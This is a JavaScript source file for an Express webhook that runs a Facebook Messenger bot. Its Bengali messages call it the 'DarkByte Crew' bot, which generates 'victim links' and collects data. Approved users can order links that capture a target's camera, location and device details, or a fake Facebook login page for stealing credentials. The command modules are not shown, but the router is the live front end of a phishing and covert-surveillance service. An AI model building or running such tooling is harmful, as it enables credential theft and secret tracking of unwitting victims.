const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const router = express.Router();
const { getConfig, sendMessage, getUserProfile } = require('../utils/helpers');
const User = require('../models/User');

async function runCommand(senderId, command, args) {
    const cmdPath = path.join(__dirname, '../commands', `${command}.js`);
    if (fs.existsSync(cmdPath)) {
        try {
            const cmd = require(cmdPath);
            if (typeof cmd.execute === 'function') {
                await cmd.execute(senderId, args, sendMessage);
            } else {
                await sendMessage(senderId, '⚠️ কমান্ড ফাইল ঠিকমতো লোড হয়নি।');
            }
        } catch (err) {
            console.error('Command error:', err);
            await sendMessage(senderId, '❌ কমান্ড চালাতে সমস্যা হয়েছে।');
        }
    } else {
        await sendMessage(senderId, '❓ এই কমান্ডটি নেই। `.camera`, `.location`, `.fb` বা `.uptime` লিখুন।');
    }
}

router.get('/webhook', (req, res) => {
    const mode = req.query['hub.mode'];
    const token = req.query['hub.verify_token'];
    const challenge = req.query['hub.challenge'];
    getConfig().then(config => {
        if (mode === 'subscribe' && token === config.verifyToken) {
            res.status(200).send(challenge);
        } else {
            res.sendStatus(403);
        }
    }).catch(() => res.sendStatus(403));
});

router.post('/webhook', async (req, res) => {
    const body = req.body;
    if (body.object !== 'page') return res.sendStatus(404);

    try {
        for (const entry of body.entry) {
            const event = entry.messaging[0];
            if (!event || !event.message || !event.message.text) continue;

            const senderId = event.sender.id;
            const text = event.message.text.trim();

            console.log(`📩 মেসেজ পেয়েছি: ${senderId} -> "${text}"`);

            let user = await User.findOne({ fbId: senderId });

            if (!user) {
                const profile = await getUserProfile(senderId);
                const firstName = profile?.first_name || 'বন্ধু';

                user = new User({
                    fbId: senderId,
                    firstName: firstName,
                    allowed: false,
                    firstSeen: new Date()
                });
                await user.save();

                const introMsg = `আসসালামু আলাইকুম ${firstName}, 👋\n\nআমি **DarkByte Crew** বট, আমি ভিক্টিম লিংক তৈরি ও ডেটা কালেক্ট করতে পারি।\n\nআপনি আমাকে ব্যবহার করতে চাইলে অ্যাডমিন এর থেকে অনুমতি নিন:\n🔗 https://facebook.com/2ndJohnnySins`;
                
                await sendMessage(senderId, introMsg);
                continue;
            }

            user.lastSeen = new Date();
            user.messageCount = (user.messageCount || 0) + 1;
            await user.save();

            if (!user.allowed) {
                await sendMessage(senderId, '⛔ আপনি আমাকে ব্যবহার করার অনুমতি পান নি।\nঅনুমতি নিতে: https://facebook.com/2ndJohnnySins');
                continue;
            }

            if (text.startsWith('.')) {
                const parts = text.slice(1).split(' ');
                const command = parts[0].toLowerCase();
                const args = parts.slice(1);
                await runCommand(senderId, command, args);
            } else {
                await sendMessage(senderId, '📌 সঠিক কমান্ড দিন:\n\n🔹 `.camera` - ক্যামেরা + ডিভাইস ইনফো লিংক\n🔹 `.location` - লোকেশন + ডিভাইস ইনফো লিংক\n🔹 `.fb` - ফেক ফেসবুক লগইন লিংক\n🔹 `.uptime` - বট আপটাইম দেখায়\n\nআরও জানতে: https://facebook.com/2ndJohnnySins');
            }
        }
        res.status(200).send('EVENT_RECEIVED');
    } catch (err) {
        console.error('❌ Webhook error:', err);
        res.status(500).send('Error');
    }
});

module.exports = router;